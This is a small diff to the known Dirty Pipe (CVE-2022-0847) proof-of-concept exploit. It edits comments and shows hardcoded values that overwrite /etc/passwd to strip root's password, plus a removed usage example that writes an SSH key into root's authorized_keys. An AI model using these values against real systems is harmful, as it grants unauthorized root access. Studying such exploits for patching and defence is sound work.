@@ -3,6 +3,7 @@
  * Copyright 2022 CM4all GmbH / IONOS SE
  *
  * author: Max Kellermann <max.kellermann@ionos.com>
+ * Modified by: peterspbr
  *
  * Proof-of-concept exploit for the Dirty Pipe
  * vulnerability (CVE-2022-0847) caused by an uninitialized
@@ -20,7 +21,6 @@
  * to add a reference to this page to the pipe), and the write cannot
  * cross a page boundary.
  *
- * Example: ./write_anything /root/.ssh/authorized_keys 1 $'\nssh-ed25519 AAA......\n'
  *
  * Further explanation: https://dirtypipe.cm4all.com/
  */
@@ -79,7 +79,6 @@ int main(int argc, char **argv)
 	}
 	*/
 
-	/* dumb command-line argument parser */
 	const char *const path = "/etc/passwd";
 	loff_t offset = 1;
 	const char *const data = "oott:";
